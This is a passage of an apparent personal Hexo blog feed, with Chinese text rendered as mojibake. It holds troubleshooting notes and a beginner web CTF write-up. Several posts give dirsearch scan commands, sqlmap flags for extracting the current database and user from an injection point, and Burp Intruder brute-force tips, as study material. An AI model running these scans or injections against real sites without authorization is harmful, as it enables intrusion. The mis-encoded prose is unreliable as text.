‡é¢˜é»˜è®¤åŠ ä¸Šäº†[ ],æˆ‘ä»¬å†æ¬¡æ·»åŠ è¿™ä¸ªç¬¦å·å°±ä¼šäº§ç”ŸæŠ¥é”™ã€‚</p><h3 id="hexo-s-æ—¶å‡ºç°æŠ¥é”™"><a href="#hexo-s-æ—¶å‡ºç°æŠ¥é”™" class="headerlink" title="hexo -s æ—¶å‡ºç°æŠ¥é”™"></a>hexo -s æ—¶å‡ºç°æŠ¥é”™</h3><p>Port 4000 has been used. Try other port instead.</p><p>åˆ†æäº†ä¸€ä¸‹ï¼Œåº”è¯¥æ˜¯æˆ‘æ°å·§åŒæ—¶ä½¿ç”¨PHP studyå’Œhexoé™æ€é¡µé¢ï¼Œæ‰€ä»¥å ç”¨äº†ç«¯å£ï¼ŒæŸ¥æ‰¾æ–‡ç« è·å¾—æ–¹æ³•ï¼š</p><p>å¯ä»¥åœ¨ç«™ç‚¹ä¸‹çš„æ–‡ä»¶_config.ymlå†…åŠ ä¸Šå¦‚ä¸‹ä»£ç æ›´æ”¹hexo-serverè¿è¡Œæ—¶çš„ç«¯å£å·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 #ç«¯å£å·éšæ„ï¼Œé»˜è®¤æ˜¯4000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure><h3 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h3><p>ä»Šå¤©å†æ¬¡å°è¯•åšå®¢ä¸Šä¼ å›¾ç‰‡ï¼ˆå¥½å§ï¼Œéƒ½æ˜¯å› ä¸ºä¹‹å‰è‡ªå·±ä¸æ–­å¤±è´¥ï¼Œè‹¦ç¬‘ingï¼‰</p><p>é‡æ–°çœ‹äº†ä¸‹csdnä¸Šä¸€ç¯‡å¥½æ–‡ç« </p><p>é™„ä¸Šé“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xjm850552586&#x2F;article&#x2F;details&#x2F;84101345?ops_request_misc&#x3D;%25257B%252522request%25255Fid%252522%25253A%252522161371871416780266219548%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id&#x3D;161371871416780266219548&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84101345.pc_search_result_before_js&amp;utm_term&#x3D;hexo%25E5%259B%25BE%25E7%2589%2587</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹‹åæœ¬åœ°åªéœ€åœ¨æ–‡ä»¶çš„ç›¸åŒåæ–‡ä»¶å¤¹ä¸‹ä¿å­˜å›¾ç‰‡ï¼Œç„¶åmarkdownç¼–è¾‘æ—¶ç›´æ¥æ·»åŠ å›¾ç‰‡å³å¯å•¦ã€‚</p><p>æ³¨æ„ï¼šæ–‡ç« å’ŒåŒåæ–‡ä»¶å¤¹éœ€è¦åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œå¦åˆ™ä¼šæ˜¾ç¤ºä¸¢å¤±è·¯å¾„ã€‚</p><h3 id="burp-intruderçˆ†ç ´å‡ºç°-Payload-set-1-Invalid-number-settingsçš„è§£å†³åŠæ³•"><a href="#burp-intruderçˆ†ç ´å‡ºç°-Payload-set-1-Invalid-number-settingsçš„è§£å†³åŠæ³•" class="headerlink" title="burp intruderçˆ†ç ´å‡ºç° Payload set 1: Invalid number settingsçš„è§£å†³åŠæ³•"></a>burp intruderçˆ†ç ´å‡ºç° Payload set 1: Invalid number settingsçš„è§£å†³åŠæ³•</h3><p>å¦‚æœç‚¹å‡»start attrack åå‡ºç° Payload set 1: Invalid number settings çš„æç¤ºï¼Œå…ˆç‚¹hex åç‚¹ decimal å†å¼€å§‹start attrackï¼Œè¿™æ˜¯ä¸€ä¸ªè½¯ä»¶bugï¼Œéœ€è¦æ‰‹åŠ¨è®©å®ƒåˆ·æ–°ã€‚<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Pythonæ•°æ®å¯è§†åŒ–åˆ©å™¨Matplotlibï¼Œæ— æ³•æ˜¾ç¤ºä¸­æ–‡ï¼Œæ€ä¹ˆåŠï¼Ÿ"><a href="#Pythonæ•°æ®å¯è§†åŒ–åˆ©å™¨Matplotlibï¼Œæ— æ³•æ˜¾ç¤ºä¸­æ–‡ï¼Œæ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="Pythonæ•°æ®å¯è§†åŒ–åˆ©å™¨Matplotlibï¼Œæ— æ³•æ˜¾ç¤ºä¸­æ–‡ï¼Œæ€ä¹ˆåŠï¼Ÿ"></a>Pythonæ•°æ®å¯è§†åŒ–åˆ©å™¨Matplotlibï¼Œæ— æ³•æ˜¾ç¤ºä¸­æ–‡ï¼Œæ€ä¹ˆåŠï¼Ÿ</h3><p><a href="https://zhuanlan.zhihu.com/p/104081310?utm_source=wechat_timeline">å½»åº•è§£å†³Pythoné‡Œmatplotlibä¸æ˜¾ç¤ºä¸­æ–‡çš„é—®é¢˜ - çŸ¥ä¹ (zhihu.com)</a></p><p>åœ¨è‡ªå·±çš„ä»£ç é‡ŒåŠ å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import matplotlib</span><br><span class="line">matplotlib.rc(&quot;font&quot;,family=&#x27;YouYuan&#x27;)</span><br></pre></td></tr></table></figure><p>è§£å†³<img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210527201252662.png" alt="image-20210527201252662"></p><h3 id="åœ¨ä½¿ç”¨phpstudyå¯åŠ¨apacheæœåŠ¡å™¨æ—¶ä¸€ç›´å‡ºç°-PHP-startup-å¼¹çª—æ€ä¹ˆåŠï¼Ÿ"><a href="#åœ¨ä½¿ç”¨phpstudyå¯åŠ¨apacheæœåŠ¡å™¨æ—¶ä¸€ç›´å‡ºç°-PHP-startup-å¼¹çª—æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="åœ¨ä½¿ç”¨phpstudyå¯åŠ¨apacheæœåŠ¡å™¨æ—¶ä¸€ç›´å‡ºç°    PHP startup  å¼¹çª—æ€ä¹ˆåŠï¼Ÿ"></a>åœ¨ä½¿ç”¨phpstudyå¯åŠ¨apacheæœåŠ¡å™¨æ—¶ä¸€ç›´å‡ºç°    PHP startup  å¼¹çª—æ€ä¹ˆåŠï¼Ÿ</h3><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111000310.png" alt="image-20210726111000310"></p><p>ä¸Šç½‘æŸ¥æ‰¾åå¾—çŸ¥ï¼Œè¿™äºphp.inié…åˆ¶æ–‡ä»¶æœ‰å…³</p><p>1.å¯¹äºé‡Œé¢çš„æ‰©å±•æ–‡ä»¶ï¼Œè‹¥ç›®å½•ä¸‹æ— æ–‡ä»¶éœ€è¦ç”¨ï¼›åŠ ä»¥å…³é—­ã€‚</p><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111308665.png" alt="image-20210726111308665"></p><p>å¦‚å›¾ï¼Œè¿™é‡Œçš„</p><p>extension=php_xmlrpc.dllåœ¨å¯¹åº”æ–‡ä»¶å¤¹é‡Œå¹¶æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ ä¸Šåˆ†å·æ¥å…³é—­ã€‚</p><p>2.è·¯å¾„çš„æ·»åŠ ï¼š</p><p>æ‰“å¼€php.iniï¼Œå¦‚æ‰¾åˆ°extension_dirä¿®æ”¹ä¸ºï¼š</p><p><strong>extension_dir = â€œD:/Program/WAMP/php/extâ€</strong></p><p>å¼•å·å†…ä½¿ç”¨ç»å¯¹è·¯å¾„å³å¯ã€‚</p><h3 id="Dirsearchçš„å®‰è£…ä¸ä½¿ç”¨"><a href="#Dirsearchçš„å®‰è£…ä¸ä½¿ç”¨" class="headerlink" title="Dirsearchçš„å®‰è£…ä¸ä½¿ç”¨"></a>Dirsearchçš„å®‰è£…ä¸ä½¿ç”¨</h3><p>è®°å½•ä¸€ä¸‹å•Šï¼Œè°ƒè¯•äº†å¥½é•¿ä¸€æ®µæ—¶é—´æ‰æˆåŠŸçš„æ‰«æå·¥å…·<strong>dirsearch</strong></p><p>æ€»ç»“è¿è¡ŒæˆåŠŸçš„å‡ ä¸ªæ¡ä»¶ï¼š</p><p>1.å®‰è£…pythonç‰ˆæœ¬3.7åŠä»¥ä¸Šï¼Œä¸”è¦ç¡®ä¿cmdå‘½ä»¤è¡Œå†…é»˜è®¤ç‰ˆæœ¬æ­£ç¡®ï¼ˆå› ä¸ºä¹‹å‰æˆ‘ä¸ºäº†ä½¿ç”¨GitHackè€Œæ›´æ”¹äº†pythonè§£é‡Šå™¨ï¼‰ã€‚</p><p>2.é‡åˆ°å¦‚ä¸‹æŠ¥é”™æ—¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:\dirsearch\dirsearch.py&quot;, line 28, in &lt;module&gt;</span><br><span class="line">    from lib.controller.controller import Controller</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .controller import Controller  # noqa: F401</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\controller.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    from lib.connection.requester import Requester</span><br><span class="line">  File &quot;D:\dirsearch\lib\connection\requester.py&quot;, line 30, in &lt;module&gt;</span><br><span class="line">    from thirdparty.requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;, line 5, in &lt;module&gt;</span><br><span class="line">    from cryptography import x509</span><br><span class="line">ModuleNotFoundError: No module named &#39;cryptography&#39;</span><br></pre></td></tr></table></figure><p>è¯´æ˜åº“æ²¡è£…ä¸Šï¼Œå¯ä»¥å»pycharmé‡Œè‡ªè¡Œå®‰è£…å®Œæ•´ã€‚</p><p>é™„ä¸Šå›¾:</p><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802195925831.png"></p><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200037618.png"></p><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200638164.png"></p><p>dirseachè‡ªå¸¦çš„å­—å…¸åœ¨dbç›®å½•ä¸‹ï¼Œä½¿ç”¨æ ¼å¼ä»¥åŠå¸¸ç”¨å‚æ•°å¦‚ä¸‹ï¼š<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p><p><strong>-<code>uåé¢è·Ÿè¦æ‰«çš„url</code></strong></p><p><strong>-<code>eæ˜¯æŒ‡å®šçš„url</code></strong></p><p><strong>-<code>wæ˜¯æŒ‡å®šå­—å…¸</code></strong></p><p><strong>-<code>ré€’å½’ç›®å½•</code></strong></p><p><strong>-<code>random</code>-agentsä½¿ç”¨éšæœºUA</strong></p><p>è¿˜å¯ä»¥è°ƒä½çº¿ç¨‹ï¼š*<em>dirsearch.py -u url -e * â€“timeout=2 -t 1 -x 400,403,404,500,503,429*</em></p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap -råé¢è·Ÿç€æ–‡ä»¶</p><p>sqlmap -uåé¢è·Ÿç€è·¯å¾„ï¼ˆurlï¼‰</p><p>sqlmapå¸¸ç”¨å‚æ•°ï¼š<br>-u : æŒ‡å®šç›®æ ‡URLï¼Œsqlæ³¨å…¥ç‚¹<br>â€“cookie : å½“å‰ä¼šè¯çš„cookieå€¼<br>-b : è·å–æ•°æ®åº“ç±»å‹ æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†<br>ï¼ˆDBMSï¼šDatabase Management System æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼‰<br>â€“current-db : è·å–å½“å‰æ•°æ®åº“<br>â€“current-user :è·å–å½“å‰ç™»å½•æ•°æ®åº“ä½¿ç”¨çš„ç”¨æˆ·</p><h3 id="æ— æ³•æ‰“å¼€é”æ–‡ä»¶-var-lib-dpkg-lock-open-13-æƒé™ä¸å¤Ÿ"><a href="#æ— æ³•æ‰“å¼€é”æ–‡ä»¶-var-lib-dpkg-lock-open-13-æƒé™ä¸å¤Ÿ" class="headerlink" title="æ— æ³•æ‰“å¼€é”æ–‡ä»¶ /var/lib/dpkg/lock - open (13: æƒé™ä¸å¤Ÿ)"></a>æ— æ³•æ‰“å¼€é”æ–‡ä»¶ /var/lib/dpkg/lock - open (13: æƒé™ä¸å¤Ÿ)</h3><p><a href="http://blog.csdn.net/zlchina1989/article/details/6033198">æ— æ³•æ‰“å¼€é”æ–‡ä»¶ /var/lib/dpkg/lock - open (13: æƒé™ä¸å¤Ÿ)  æ— æ³•å¯¹çŠ¶æ€åˆ—è¡¨ç›®å½•åŠ é”(/var/lib/dpkg/)ï¼Œè¯·æŸ¥çœ‹æ‚¨æ˜¯å¦æ­£ä»¥ root ç”¨æˆ·è¿è¡Œï¼Ÿ</a></p><p>è§£å†³çš„åŠæ³•ï¼šåœ¨å‰é¢åŠ sudoï¼Œä¹Ÿå°±æ˜¯sudo apt-get install xxxxx</p><p>ä½¿å¾—è‡ªå·±çš„æŒ‡ä»¤æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ã€‚</p><h3 id="Hexoä¿®æ”¹å­—ä½“"><a href="#Hexoä¿®æ”¹å­—ä½“" class="headerlink" title="Hexoä¿®æ”¹å­—ä½“"></a>Hexoä¿®æ”¹å­—ä½“</h3><p><a href="https://blog.csdn.net/m0_46296826/article/details/115350456">https://blog.csdn.net/m0_46296826/article/details/115350456</a></p><h3 id="Hexoå°é¢å›¾ç‰‡"><a href="#Hexoå°é¢å›¾ç‰‡" class="headerlink" title="Hexoå°é¢å›¾ç‰‡"></a>Hexoå°é¢å›¾ç‰‡</h3><p>å…è´¹åˆ¶ä½œå›¾åºŠçš„ç½‘å€ï¼š</p><p><a href="https://imgurl.org/">ImgURLå…è´¹å›¾åºŠ</a></p><p>ç»è¿‡è¿™é‡ŒåŠ å·¥åï¼Œé€‰æ‹©åˆé€‚çš„è·¯å¾„</p><p>åœ¨åšå®¢æ–‡ç« çš„coverï¼ˆå¯ä»¥æ‰‹åŠ¨æ·»åŠ )åé¢åŠ ä¸Š</p><p>å°±å¯ä»¥æœ‰æ¼‚äº®çš„æ–‡ç« å°é¢å•¦ï¼</p><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210830165519649.png" alt="image-20210830165519649"></p><p>ä¸è¿‡è¿™ä¸ªæ˜¯æš‚æ—¶çš„ï¼Œdoge</p><p>å–æ¶ˆå°é¢çš„è¯ï¼Œåªéœ€è¦åœ¨coveråé¢åŠ ä¸Šfalseå°±å¥½</p><h3 id="AttributeError-module-â€˜datetimeâ€™-has-no-attribute-â€˜nowâ€™"><a href="#AttributeError-module-â€˜datetimeâ€™-has-no-attribute-â€˜nowâ€™" class="headerlink" title="AttributeError: module â€˜datetimeâ€™ has no attribute â€˜nowâ€™"></a>AttributeError: module â€˜datetimeâ€™ has no attribute â€˜nowâ€™</h3><p>ä»Šå¤©pythonä»£ç å‡ºç°è¿™æ ·çš„æŠ¥é”™ï¼Œ</p><p>ç»è¿‡ä¸Šç½‘æŸ¥è¯¢å¾—çŸ¥ï¼ŒåŸæ¥æ˜¯æˆ‘æ–‡ä»¶å‘½åå’Œæ‰€è°ƒç”¨åº“ä¸€æ ·ï¼Œå¯¼è‡´</p><p>å¯¼å…¥æ—¶å›è¦†ç›–datetimeåº“</p><p>è¿™æ˜¯åˆ«äººæ–‡ç« çš„åŸè¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">datetimeæ˜¯pythonä¸­çš„å†…ç½®æ¨¡å—ï¼Œæ­£å¸¸åº”è¯¥ä¸ä¼šæŠ¥é”™ï¼Œæ£€æŸ¥åå‘ç°æ˜¯ä¸€ä¸ªå¾ˆä½çº§é”™è¯¯ï¼Œ æˆ‘ç»™æˆ‘çš„æ–‡ä»¶åèµ·çš„å°±æ˜¯datetime.py æ‰€ä»¥å¯¼å…¥æ—¶ä¼šè¦†ç›–datetimeè¿™ä¸ªåŒ…ã€‚å°†æ–‡ä»¶åå­—æ”¹äº†å°±å¥½äº†ã€‚</span><br></pre></td></tr></table></figure><h3 id="Turtleåº“å¦‚ä½•ç»˜åˆ¶ç”¨æˆ·æƒ³è¦å›¾æ¡ˆ"><a href="#Turtleåº“å¦‚ä½•ç»˜åˆ¶ç”¨æˆ·æƒ³è¦å›¾æ¡ˆ" class="headerlink" title="Turtleåº“å¦‚ä½•ç»˜åˆ¶ç”¨æˆ·æƒ³è¦å›¾æ¡ˆ"></a>Turtleåº“å¦‚ä½•ç»˜åˆ¶ç”¨æˆ·æƒ³è¦å›¾æ¡ˆ</h3><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œåœ¨ä¸€ç¯‡turtleæ–‡ç« ä¸‹é¢æ‰¾åˆ°äº†ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨é¼ æ ‡ç‚¹å‡»äº‹å…ˆç¡®å®šä½ç½®ï¼Œè¿”å›å€¼ä¸ºä¸€ä¸ªåæ ‡</span><br></pre></td></tr></table></figure><p>è¿™å¥è¯ä»¤æˆ‘æƒ³æ³•å¤šäº†èµ·æ¥ï¼Œç°æœ‰çš„æƒ³æ³•æ˜¯æœ‰ä»€ä¹ˆä»£ç å¯ä»¥æŠŠåæ ‡å€¼æ‰“å°</p><p>ç„¶åæ ¹æ®åæ ‡å€¼ç¼–å†™ç›¸åº”çš„è°ƒç”¨turtleåº“çš„ä»£ç </p><h3 id="ReadTimeoutError-HTTPSConnectionPool-host-â€™files-pythonhosted-orgâ€™-port-443-Read-timed-out"><a href="#ReadTimeoutError-HTTPSConnectionPool-host-â€™files-pythonhosted-orgâ€™-port-443-Read-timed-out" class="headerlink" title="ReadTimeoutError: HTTPSConnectionPool(host=â€™files.pythonhosted.orgâ€™, port=443): Read timed out."></a>ReadTimeoutError: HTTPSConnectionPool(host=â€™files.pythonhosted.orgâ€™, port=443): Read timed out.</h3><p><a href="https://www.cnblogs.com/ring1992/p/13971119.html">PythonæŠ¥é”™ReadTimeoutError: HTTPSConnectionPool(host=â€™files.pythonhosted.orgâ€™, port=443): Read timed out. - Ring_1992 - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="visual-codeå®‰è£…phpè¿è¡Œé…ç½®ç¯å¢ƒ"><a href="#visual-codeå®‰è£…phpè¿è¡Œé…ç½®ç¯å¢ƒ" class="headerlink" title="visual codeå®‰è£…phpè¿è¡Œé…ç½®ç¯å¢ƒ"></a>visual codeå®‰è£…phpè¿è¡Œé…ç½®ç¯å¢ƒ</h3><p><a href="https://www.bilibili.com/video/BV1XE41147Kc?p=1&share_medium=android&share_plat=android&share_session_id=7ca75de8-83ff-4a4b-a87e-afe4faf6360c&share_source=QQ&share_tag=s_i&timestamp=1633683248&unique_k=dejn9X">å°ç™½å¿…çœ‹çš„phpå…¥é—¨æ•™ç¨‹ï¼Œphpç¼–è¾‘ç¥å™¨æ¨èï¼Œvisual studio codeï¼ˆvscodeï¼‰ï¼Œæ•™å¤§å®¶è£…æ’ä»¶åæé«˜æ•ˆç‡_å“”å“©å“”å“©_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV14E411L7kL?p=1&share_medium=android&share_plat=android&share_session_id=ed416c37-a6c1-4679-82ed-5d3283230595&share_source=QQ&share_tag=s_i&timestamp=1633683271&unique_k=tORPhM">ã€phpåŸºç¡€æ•™ç¨‹ã€‘php pathç¯å¢ƒå˜é‡çš„é…ç½®ï¼Œè§£å†³vscodeä¸èƒ½å³é”®è¿è¡Œphpä»£ç çš„é—®é¢˜_å“”å“©å“”å“©_bilibili</a></p><p>ç¬¬ä¸€ä¸ªè§†é¢‘æ•™å­¦å¦‚ä½•å®‰è£…ã€å»ºè®®çš„PHPæ’ä»¶ï¼Œæ¯”å¦‚Run Code</p><p>ç¬¬äºŒä¸ªè§†é¢‘æ•™å­¦æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œæ˜¯ç¡®ä¿ä¸ä¼šä¹±ç </p><p>æ•ˆæœå›¾ï¼š</p><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211009200155499.png" alt="image-20211009200155499"></p>]]></content>
      
      
      
        <tags>
            
            <tag> åšå®¢ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å ç”¨å†…å­˜æœ‰å…³</title>
      <link href="/2020/10/15/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/"/>
      <url>/2020/10/15/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>è®©æ•´æ•°å ç”¨æ›´å°‘çš„å†…å­˜å¯ä»¥åœ¨ int å‰è¾¹åŠ  shortï¼Œè®©æ•´æ•°å ç”¨æ›´å¤šçš„å†…å­˜å¯ä»¥åœ¨ int å‰è¾¹åŠ  longï¼Œä¾‹å¦‚ï¼š</p><p>short int a = 10;<br>short int b, c = 99;<br>long int m = 102023;<br>long int n, p = 562131;</p><p>è¿™æ · aã€bã€c åªå ç”¨ 2 ä¸ªå­—èŠ‚çš„å†…å­˜ï¼Œè€Œ mã€nã€p å¯èƒ½ä¼šå ç”¨ 8 ä¸ªå­—èŠ‚çš„å†…å­˜ã€‚</p><p>ä¹Ÿå¯ä»¥å°† int çœç•¥ï¼Œåªå†™ short å’Œ longï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>short a = 10;<br>short b, c = 99;<br>long m = 102023;<br>long n, p = 562131;</p><p>è¿™æ ·çš„å†™æ³•æ›´åŠ ç®€æ´ï¼Œå®é™…å¼€å‘ä¸­å¸¸ç”¨ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°æ‰‹åŒº</title>
      <link href="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/"/>
      <url>/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="View-source"><a href="#View-source" class="headerlink" title="View_source"></a>View_source</h4><p>ç›´æ¥è¿›å…¥æŸ¥çœ‹å™¨æŸ¥çœ‹ï¼›</p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(59).png"></p><h4 id="Get-post"><a href="#Get-post" class="headerlink" title="Get_post"></a>Get_post</h4><p>æµ…è°ˆHTTPä¸­GETã€POSTç”¨æ³•ä»¥åŠå®ƒä»¬çš„åŒºåˆ«</p><p>æ¥è‡ª <a href="https://www.cnblogs.com/williamjie/p/9099940.html">https://www.cnblogs.com/williamjie/p/9099940.html</a> </p><p>è§£é¢˜è¿‡ç¨‹ï¼šget ï¼šåœ¨è·¯å¾„åç›´æ¥æ·»åŠ ?a=1;</p><p>â€‹           post: å‹¾é€‰post data ï¼Œå¡«å…¥b=2.</p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(73).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(75).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(76).png"></p><h4 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h4><p>1.æŸ¥çœ‹åè®®ï¼šè·¯å¾„åæ·»åŠ robots.txtæ¥æŸ¥çœ‹ï¼›</p><p>2.å‘ç°å¾—åˆ°è¯­å¥:</p><p>User-agent: *<br>Disallow:<br>Disallow: f1ag_1s_h3re.php</p><p>(æ­¤åœ°æ— é“¶) ç›´æ¥æ„é€ è¯­å¥æ¥è®¿é—®ç½‘ç«™æ ¹ç›®å½•ä¸‹.phpæ–‡ä»¶</p><p>æ·»åŠ f1ag_1s_h3re.phpã€‚</p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(60).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(61).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(62).png"></p><h4 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h4><p>phpçš„å¤‡ä»½æœ‰ä¸¤ç§ï¼š*.php~å’Œ*.php.bak</p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(63).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(64).png"></p><p>æ¥è‡ª <a href="https://www.cnblogs.com/yunqian2017/p/11515443.html">https://www.cnblogs.com/yunqian2017/p/11515443.html</a> </p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>æŠ“åŒ…é…åˆç«ç‹ä½¿ç”¨</p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(65).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(66).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(67).png"></p><p>æ¥è‡ª &lt;<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1</a></p><h4 id="Disabled-button"><a href="#Disabled-button" class="headerlink" title="Disabled_button"></a>Disabled_button</h4><p>ç›´æ¥ç¼–è¾‘ä¿®æ”¹ï¼šé¢˜ç›®ä¸ºdisabledé‚£å°±ç”¨å°èªæ˜å°†å®ƒæ”¹æˆabledã€‚</p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(68).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(69).png"></p><h4 id="Weak-auth"><a href="#Weak-auth" class="headerlink" title="Weak auth"></a>Weak auth</h4><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(78).png"></p><p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(79).png"></p><h4 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple php"></a>Simple php</h4><p><img 